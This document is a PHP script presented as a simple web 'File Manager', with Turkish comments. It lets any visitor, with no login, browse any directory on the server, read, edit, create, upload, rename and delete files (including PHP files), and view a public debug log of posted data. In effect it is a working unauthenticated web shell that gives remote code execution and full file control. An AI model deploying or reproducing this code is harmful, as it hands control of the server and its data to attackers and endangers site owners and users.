<?php
// Debug mode - tüm hataları göster
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);

$current = isset($_GET['path']) ? $_GET['path'] : getcwd();
$current = realpath($current);
if (!$current || !is_dir($current)) {
    $current = getcwd();
}

$item = isset($_GET['item']) ? basename($_GET['item']) : "";
$itemPath = $current . "/" . $item;

// DEBUG: Hata ayıklama için log dosyası
function debug_log($msg) {
    $logFile = __DIR__ . '/debug_log.txt';
    file_put_contents($logFile, date('Y-m-d H:i:s') . ' - ' . $msg . PHP_EOL, FILE_APPEND);
}

// Edit işlemi
if (isset($_GET['action']) && $_GET['action'] === 'edit' && !empty($item)) {
    debug_log("Edit action - File: $itemPath");
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        debug_log("POST received for edit");
        $content = $_POST['content'];
        $result = file_put_contents($itemPath, $content);
        debug_log("Write result: " . ($result !== false ? "SUCCESS ($result bytes)" : "FAILED"));
        
        if ($result !== false) {
            echo "<script>alert('✅ Saved!'); window.location='?path=" . urlencode($current) . "';</script>";
        } else {
            echo "<script>alert('❌ Save failed! Check permissions.'); window.history.back();</script>";
        }
        exit;
    }
    
    if (!file_exists($itemPath)) {
        echo "<h3>Error: File not found!</h3>";
        echo "<a href='?path=" . urlencode($current) . "'>← Back</a>";
        exit;
    }
    
    $content = htmlspecialchars(file_get_contents($itemPath));
    echo "<!DOCTYPE html>
    <html>
    <head><title>Edit File</title>
    <style>
        body { font-family: monospace; margin: 20px; }
        textarea { width: 100%; height: 500px; font-family: monospace; border: 1px solid #ccc; padding: 10px; }
        button { padding: 10px 20px; background: #28a745; color: white; border: none; cursor: pointer; font-size: 16px; }
        button:hover { background: #218838; }
        a { color: #007bff; text-decoration: none; }
        .info { background: #e3f2fd; padding: 10px; margin: 10px 0; border-left: 4px solid #2196f3; }
    </style>
    </head>
    <body>
    <a href='?path=" . urlencode($current) . "'>← Back to Directory</a>
    <div class='info'>
        <strong>Editing:</strong> " . htmlspecialchars($item) . "<br>
        <strong>Path:</strong> " . htmlspecialchars($itemPath) . "<br>
        <strong>Writable:</strong> " . (is_writable($itemPath) ? 'Yes ✅' : 'No ❌') . "
    </div>
    <form method='post'>
    <textarea name='content'>$content</textarea>
    <br><button type='submit'>💾 Save Changes</button>
    </form>
    </body>
    </html>";
    exit;
}

// Delete işlemi
if (isset($_GET['action']) && $_GET['action'] === 'delete' && !empty($item)) {
    debug_log("Delete action - Path: $itemPath");
    
    if (file_exists($itemPath)) {
        if (is_dir($itemPath)) {
            if (rmdir($itemPath)) {
                debug_log("Folder deleted: $itemPath");
            } else {
                debug_log("Failed to delete folder: $itemPath");
            }
        } else {
            if (unlink($itemPath)) {
                debug_log("File deleted: $itemPath");
            } else {
                debug_log("Failed to delete file: $itemPath");
            }
        }
    }
    header("Location: ?path=" . urlencode($current));
    exit;
}

// Rename işlemi
if (isset($_GET['action']) && $_GET['action'] === 'rename' && !empty($item)) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $newName = basename($_POST['new_name']);
        $newPath = $current . "/" . $newName;
        debug_log("Rename: $itemPath -> $newPath");
        
        if (!file_exists($newPath)) {
            if (rename($itemPath, $newPath)) {
                debug_log("Rename SUCCESS");
            } else {
                debug_log("Rename FAILED");
            }
        }
        header("Location: ?path=" . urlencode($current));
        exit;
    }
    
    echo "<!DOCTYPE html>
    <html>
    <head><title>Rename</title>
    <style>
        body { font-family: Arial; margin: 20px; }
        input { padding: 8px; width: 300px; border: 1px solid #ccc; }
        button { padding: 8px 20px; background: #007bff; color: white; border: none; cursor: pointer; }
    </style>
    </head>
    <body>
    <a href='?path=" . urlencode($current) . "'>← Back</a>
    <h3>Rename: " . htmlspecialchars($item) . "</h3>
    <form method='post'>
    <input type='text' name='new_name' value='" . htmlspecialchars($item) . "'>
    <button type='submit'>Rename</button>
    </form>
    </body>
    </html>";
    exit;
}

// Upload işlemi sayfası
if (isset($_GET['upload'])) {
    echo "<!DOCTYPE html>
    <html>
    <head><title>Upload File</title>
    <style>
        body { font-family: Arial; margin: 20px; }
        .upload-box { background: #f8f9fa; padding: 20px; border: 2px dashed #ccc; text-align: center; max-width: 500px; margin: 50px auto; }
        input[type=file] { margin: 20px 0; }
        button { padding: 10px 30px; background: #28a745; color: white; border: none; cursor: pointer; font-size: 16px; }
        .info { background: #e3f2fd; padding: 10px; margin: 10px 0; }
    </style>
    </head>
    <body>
    <a href='?path=" . urlencode($current) . "'>← Back to Directory</a>
    <div class='upload-box'>
        <h3>📤 Upload File</h3>
        <div class='info'>Upload to: <strong>" . htmlspecialchars($current) . "</strong></div>
        <div class='info'>Directory writable: " . (is_writable($current) ? '✅ Yes' : '❌ No') . "</div>
        <form method='post' enctype='multipart/form-data' action='?upload_handler=1&path=" . urlencode($current) . "'>
        <input type='file' name='file' required>
        <br><button type='submit'>Upload File</button>
        </form>
    </div>
    </body>
    </html>";
    exit;
}

// Upload handler
if (isset($_GET['upload_handler'])) {
    $targetDir = $_GET['path'] ?? getcwd();
    $targetDir = realpath($targetDir);
    
    debug_log("Upload handler - Target dir: $targetDir");
    debug_log("POST data: " . print_r($_POST, true));
    debug_log("FILES data: " . print_r($_FILES, true));
    
    if (!empty($_FILES['file']['name'])) {
        $fileName = basename($_FILES['file']['name']);
        $targetFile = $targetDir . "/" . $fileName;
        
        debug_log("Uploading: $fileName to $targetFile");
        debug_log("Temp file: " . $_FILES['file']['tmp_name']);
        debug_log("Upload error code: " . $_FILES['file']['error']);
        
        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
            chmod($targetFile, 0644);
            debug_log("Upload SUCCESS: $targetFile");
            echo "<script>alert('✅ Uploaded: " . addslashes($fileName) . "'); window.location='?path=" . urlencode($targetDir) . "';</script>";
        } else {
            $errorMsg = "Upload FAILED. Error: " . $_FILES['file']['error'];
            debug_log($errorMsg);
            echo "<script>alert('❌ " . $errorMsg . "'); window.location='?upload=1&path=" . urlencode($targetDir) . "';</script>";
        }
    } else {
        debug_log("No file uploaded");
        header("Location: ?path=" . urlencode($targetDir));
    }
    exit;
}

// Create folder
if (isset($_POST['create_folder'])) {
    $folderName = basename($_POST['folder_name']);
    if (!empty($folderName)) {
        $folderPath = $current . "/" . $folderName;
        debug_log("Create folder: $folderPath");
        if (!file_exists($folderPath)) {
            if (mkdir($folderPath, 0755)) {
                debug_log("Folder created");
            } else {
                debug_log("Folder creation FAILED");
            }
        }
    }
    header("Location: ?path=" . urlencode($current));
    exit;
}

// Create file
if (isset($_POST['create_file'])) {
    $fileName = basename($_POST['file_name']);
    if (!empty($fileName)) {
        $filePath = $current . "/" . $fileName;
        debug_log("Create file: $filePath");
        if (!file_exists($filePath)) {
            $result = file_put_contents($filePath, $_POST['file_content'] ?? '');
            if ($result !== false) {
                chmod($filePath, 0644);
                debug_log("File created, bytes: $result");
            } else {
                debug_log("File creation FAILED");
            }
        }
    }
    header("Location: ?path=" . urlencode($current));
    exit;
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager</title>
    <meta charset="UTF-8">
    <style>
        * { box-sizing: border-box; }
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .current-path { background: #e3f2fd; padding: 10px; margin: 10px 0; border-radius: 3px; border-left: 4px solid #2196f3; }
        ul { list-style: none; padding: 0; margin: 0; }
        li { padding: 10px; margin: 2px 0; background: #fafafa; border: 1px solid #eee; border-radius: 3px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
        li:hover { background: #f0f0f0; }
        .folder { border-left: 3px solid #ff9800; }
        .file { border-left: 3px solid #4caf50; }
        .item-name { font-weight: bold; }
        .item-name a { text-decoration: none; color: #333; }
        .item-name a:hover { color: #2196f3; }
        .action-links { display: inline-block; }
        .action-links a { font-size: 12px; margin-left: 10px; color: #666; text-decoration: none; padding: 2px 5px; border-radius: 3px; }
        .action-links a:hover { background: #e0e0e0; color: #333; }
        button, .button { display: inline-block; padding: 8px 15px; margin: 5px 0; background: #2196f3; color: white; border: none; border-radius: 3px; cursor: pointer; font-size: 14px; text-decoration: none; }
        button:hover, .button:hover { background: #1976d2; }
        hr { margin: 20px 0; border: none; border-top: 1px solid #ddd; }
        h3 { margin: 15px 0 10px 0; color: #333; }
        input[type="text"], textarea { padding: 8px; border: 1px solid #ddd; border-radius: 3px; width: 100%; max-width: 400px; }
        textarea { max-width: 600px; font-family: monospace; }
        .form-group { margin-bottom: 10px; }
        .upload-area { background: #e8f5e9; padding: 15px; border-radius: 5px; margin: 10px 0; }
        .debug-link { font-size: 12px; color: #999; margin-top: 20px; text-align: center; }
        .debug-link a { color: #999; }
    </style>
</head>
<body>
<div class="container">
    <h1>📁 File Manager</h1>
    
    <?php
    // List directory function
    function listDirectory($dir) {
        $files = scandir($dir);
        $items = [];
        
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            $items[] = $file;
        }
        
        sort($items);
        
        if (empty($items)) {
            echo "<p><em>Directory is empty</em></p>";
            return;
        }
        
        echo "<ul>";
        foreach ($items as $item) {
            $fullPath = $dir . "/" . $item;
            $isDir = is_dir($fullPath);
            
            echo "<li class='" . ($isDir ? 'folder' : 'file') . "'>";
            echo "<div class='item-name'>";
            
            if ($isDir) {
                echo "📁 <a href='?path=" . urlencode($fullPath) . "'><strong>" . htmlspecialchars($item) . "</strong></a>";
            } else {
                echo "📄 <strong>" . htmlspecialchars($item) . "</strong>";
            }
            
            echo "</div><div class='action-links'>";
            
            if ($isDir) {
                echo "<a href='?action=rename&path=" . urlencode($dir) . "&item=" . urlencode($item) . "'>✏️ Rename</a>";
                echo "<a href='?action=delete&path=" . urlencode($dir) . "&item=" . urlencode($item) . "' onclick='return confirm(\"Delete folder " . htmlspecialchars($item) . "?\")'>🗑️ Delete</a>";
            } else {
                $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                $editable = in_array($ext, ['txt', 'html', 'htm', 'css', 'js', 'php', 'xml', 'json', 'md', 'sql']);
                
                if ($editable) {
                    echo "<a href='?action=edit&path=" . urlencode($dir) . "&item=" . urlencode($item) . "'>✏️ Edit</a>";
                }
                echo "<a href='?action=rename&path=" . urlencode($dir) . "&item=" . urlencode($item) . "'>✏️ Rename</a>";
                echo "<a href='?action=delete&path=" . urlencode($dir) . "&item=" . urlencode($item) . "' onclick='return confirm(\"Delete file " . htmlspecialchars($item) . "?\")'>🗑️ Delete</a>";
            }
            
            echo "</div></li>";
        }
        echo "</ul>";
    }
    ?>
    
    <div class="current-path">
        <strong>📍 Current Path:</strong> <?php echo htmlspecialchars($current); ?>
        <div style="margin-top: 8px;">
            <a href="?path=<?php echo urlencode(dirname($current)); ?>" class="button" style="background: #6c757d;">⬆ Up</a>
            <a href="?path=<?php echo urlencode(getcwd()); ?>" class="button" style="background: #6c757d;">🏠 Root</a>
        </div>
    </div>
    
    <?php listDirectory($current); ?>
    
    <hr>
    
    <div class="upload-area">
        <h3>📤 Upload File</h3>
        <a href="?upload=1&path=<?php echo urlencode($current); ?>" class="button">Upload File →</a>
    </div>
    
    <hr>
    
    <h3>📁 Create Folder</h3>
    <form method="post">
        <input type="hidden" name="create_folder" value="1">
        <div class="form-group">
            <input type="text" name="folder_name" placeholder="folder name" required>
        </div>
        <button type="submit">Create Folder</button>
    </form>
    
    <hr>
    
    <h3>📄 Create File</h3>
    <form method="post">
        <input type="hidden" name="create_file" value="1">
        <div class="form-group">
            <input type="text" name="file_name" placeholder="filename.txt" required>
        </div>
        <div class="form-group">
            <textarea name="file_content" placeholder="File content (optional)" rows="5" cols="50"></textarea>
        </div>
        <button type="submit">Create File</button>
    </form>
    
    <div class="debug-link">
        <a href="debug_log.txt" target="_blank">📋 View Debug Log</a> | 
        <a href="?clear_log=1">🗑️ Clear Log</a>
    </div>
</div>
</body>
</html>

<?php
// Clear debug log
if (isset($_GET['clear_log'])) {
    unlink(__DIR__ . '/debug_log.txt');
    header("Location: ?path=" . urlencode($current));
    exit;
}
?>
